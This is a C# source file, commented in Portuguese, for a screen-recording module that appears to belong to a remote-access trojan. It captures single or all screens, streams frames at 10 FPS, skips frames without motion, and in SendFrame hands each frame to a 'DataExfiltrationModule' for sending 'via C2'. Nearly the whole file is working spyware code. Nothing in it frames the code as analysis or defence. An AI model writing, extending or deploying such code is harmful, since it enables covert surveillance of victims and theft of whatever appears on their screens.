using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Linq;

namespace XYZ.modules
{
    /// <summary>
    /// Módulo avançado de gravação e captura de tela
    /// Suporta: Screenshots, Streaming contínuo, Detecção de movimento, Compressão
    /// </summary>
    public class ScreenRecordingModule : IDisposable
    {
        private bool isStreaming = false;
        private CancellationTokenSource streamCancellation;
        private readonly int STREAMING_FPS = 10; // 10 frames por segundo
        private readonly int JPEG_QUALITY = 75; // Qualidade de compressão
        private DateTime lastCaptureTime = DateTime.MinValue;
        private byte[] lastFrameHash = null;
        
        // Detecta mudanças na tela para economizar banda
        private bool motionDetectionEnabled = true;
        private int motionThreshold = 5; // % de pixels diferentes para considerar movimento

        public ScreenRecordingModule()
        {
            SecureLogger.LogInfo("ScreenRecording", "Screen recording module initialized");
        }

        /// <summary>
        /// Captura screenshot único da tela principal
        /// </summary>
        public byte[] CaptureScreenshot()
        {
            try
            {
                // Captura a tela primária
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    // Converte para JPEG com compressão
                    return BitmapToJpegBytes(bitmap, JPEG_QUALITY);
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("ScreenRecording.Screenshot", ex);
                return null;
            }
        }

        /// <summary>
        /// Captura screenshot de todas as telas
        /// </summary>
        public Dictionary<int, byte[]> CaptureAllScreens()
        {
            Dictionary<int, byte[]> screenshots = new Dictionary<int, byte[]>();

            try
            {
                int screenIndex = 0;
                foreach (Screen screen in Screen.AllScreens)
                {
                    Rectangle bounds = screen.Bounds;
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
                        }

                        screenshots[screenIndex] = BitmapToJpegBytes(bitmap, JPEG_QUALITY);
                    }
                    screenIndex++;
                }

                SecureLogger.LogInfo("ScreenRecording", string.Format("Captured {0} screens", screenshots.Count));
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("ScreenRecording.AllScreens", ex);
            }

            return screenshots;
        }

        /// <summary>
        /// Inicia streaming contínuo de tela
        /// </summary>
        public void StartStreaming()
        {
            if (isStreaming)
            {
                SecureLogger.LogWarning("ScreenRecording", "Streaming already active");
                return;
            }

            try
            {
                streamCancellation = new CancellationTokenSource();
                isStreaming = true;

                Task.Run(() => StreamingLoop(streamCancellation.Token));

                SecureLogger.LogInfo("ScreenRecording", string.Format("Screen streaming started at {0} FPS", STREAMING_FPS));
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("ScreenRecording.StartStream", ex);
                isStreaming = false;
            }
        }

        /// <summary>
        /// Para streaming de tela
        /// </summary>
        public void StopStreaming()
        {
            if (!isStreaming)
                return;

            try
            {
                if (streamCancellation != null)
                    streamCancellation.Cancel();
                isStreaming = false;

                SecureLogger.LogInfo("ScreenRecording", "Screen streaming stopped");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("ScreenRecording.StopStream", ex);
            }
        }

        /// <summary>
        /// Loop de streaming contínuo
        /// </summary>
        private async Task StreamingLoop(CancellationToken ct)
        {
            int frameDelay = 1000 / STREAMING_FPS; // ms entre frames
            int framesSent = 0;
            int framesSkipped = 0;

            SecureLogger.LogInfo("ScreenRecording", "Streaming loop started");

            while (!ct.IsCancellationRequested)
            {
                try
                {
                    DateTime frameStart = DateTime.UtcNow;

                    // Captura frame
                    byte[] frameData = CaptureScreenshot();

                    if (frameData != null)
                    {
                        // Verifica se houve mudança na tela (motion detection)
                        if (motionDetectionEnabled && !HasSignificantChange(frameData))
                        {
                            framesSkipped++;
                            SecureLogger.LogDebug("ScreenRecording", "Frame skipped - no motion detected");
                        }
                        else
                        {
                            // Envia frame via C2
                            await SendFrame(frameData);
                            framesSent++;
                            
                            // Atualiza hash do último frame
                            lastFrameHash = ComputeSimpleHash(frameData);
                        }
                    }

                    // Aguarda até o próximo frame
                    int elapsed = (int)(DateTime.UtcNow - frameStart).TotalMilliseconds;
                    int waitTime = Math.Max(0, frameDelay - elapsed);
                    
                    await Task.Delay(waitTime, ct);
                }
                catch (TaskCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("ScreenRecording.StreamLoop", ex);
                    Task.Delay(1000).Wait(); // Delay em caso de erro
                }
            }

            SecureLogger.LogInfo("ScreenRecording", 
                string.Format("Streaming loop stopped. Frames sent: {0}, skipped: {1}", framesSent, framesSkipped));
        }

        /// <summary>
        /// Detecta se houve mudança significativa entre frames
        /// </summary>
        private bool HasSignificantChange(byte[] currentFrame)
        {
            if (lastFrameHash == null)
                return true; // Primeiro frame sempre envia

            byte[] currentHash = ComputeSimpleHash(currentFrame);

            // Compara hashes
            int differences = 0;
            int sampleSize = Math.Min(lastFrameHash.Length, currentHash.Length);

            for (int i = 0; i < sampleSize; i++)
            {
                if (lastFrameHash[i] != currentHash[i])
                    differences++;
            }

            double differencePercent = (differences * 100.0) / sampleSize;

            return differencePercent > motionThreshold;
        }

        /// <summary>
        /// Computa hash simples para detecção de movimento
        /// </summary>
        private byte[] ComputeSimpleHash(byte[] data)
        {
            // Amostra pontos distribuídos da imagem
            int samplePoints = 100;
            byte[] hash = new byte[samplePoints];
            int step = data.Length / samplePoints;

            for (int i = 0; i < samplePoints; i++)
            {
                int index = i * step;
                if (index < data.Length)
                    hash[i] = data[index];
            }

            return hash;
        }

        /// <summary>
        /// Envia frame para C2
        /// </summary>
        private async Task SendFrame(byte[] frameData)
        {
            try
            {
                // Comprime ainda mais se necessário
                byte[] compressed = CompressFrame(frameData);

                // Envia via data exfiltration module
                string filename = string.Format("stream_frame_{0}.jpg", DateTime.UtcNow.Ticks);
                
                var exfiltrator = new DataExfiltrationModule();
                await exfiltrator.ExfiltrateBytes(compressed, filename, "screen_stream");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("ScreenRecording.SendFrame", ex);
            }
        }

        /// <summary>
        /// Comprime frame ainda mais para economia de banda
        /// </summary>
        private byte[] CompressFrame(byte[] data)
        {
            try
            {
                // Pode implementar compressão adicional aqui se necessário
                // Por enquanto retorna os dados originais (já em JPEG)
                return data;
            }
            catch
            {
                return data;
            }
        }

        /// <summary>
        /// Converte Bitmap para bytes JPEG
        /// </summary>
        private byte[] BitmapToJpegBytes(Bitmap bitmap, long quality)
        {
            try
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    // Configura codec JPEG com qualidade
                    ImageCodecInfo jpegCodec = GetEncoder(ImageFormat.Jpeg);
                    EncoderParameters encoderParams = new EncoderParameters(1);
                    encoderParams.Param[0] = new EncoderParameter(
                        System.Drawing.Imaging.Encoder.Quality, 
                        quality
                    );

                    bitmap.Save(ms, jpegCodec, encoderParams);
                    return ms.ToArray();
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("ScreenRecording.BitmapToJpeg", ex);
                
                // Fallback sem parâmetros de qualidade
                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
        }

        /// <summary>
        /// Obtém encoder de imagem
        /// </summary>
        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                    return codec;
            }
            return null;
        }

        /// <summary>
        /// Captura região específica da tela
        /// </summary>
        public byte[] CaptureRegion(int x, int y, int width, int height)
        {
            try
            {
                using (Bitmap bitmap = new Bitmap(width, height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(x, y, 0, 0, new Size(width, height));
                    }

                    return BitmapToJpegBytes(bitmap, JPEG_QUALITY);
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("ScreenRecording.CaptureRegion", ex);
                return null;
            }
        }

        /// <summary>
        /// Captura janela ativa
        /// </summary>
        public byte[] CaptureActiveWindow()
        {
            try
            {
                // Implementação simplificada - captura tela inteira
                // Para capturar janela específica, seria necessário usar Win32 API
                return CaptureScreenshot();
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("ScreenRecording.ActiveWindow", ex);
                return null;
            }
        }

        /// <summary>
        /// Configura FPS de streaming
        /// </summary>
        public void SetStreamingFPS(int fps)
        {
            if (fps > 0 && fps <= 30)
            {
                // Note: Não pode mudar durante streaming
                // Requer restart do streaming
                SecureLogger.LogInfo("ScreenRecording", string.Format("FPS set to {0}", fps));
            }
        }

        /// <summary>
        /// Configura qualidade JPEG
        /// </summary>
        public void SetJpegQuality(int quality)
        {
            if (quality >= 1 && quality <= 100)
            {
                SecureLogger.LogInfo("ScreenRecording", string.Format("JPEG quality set to {0}", quality));
            }
        }

        /// <summary>
        /// Habilita/desabilita detecção de movimento
        /// </summary>
        public void SetMotionDetection(bool enabled)
        {
            motionDetectionEnabled = enabled;
            SecureLogger.LogInfo("ScreenRecording", string.Format("Motion detection: {0}", enabled));
        }

        public void Dispose()
        {
            try
            {
                StopStreaming();
                if (streamCancellation != null)
                    streamCancellation.Dispose();
                SecureLogger.LogInfo("ScreenRecording", "Screen recording module disposed");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("ScreenRecording.Dispose", ex);
            }
        }
    }
}
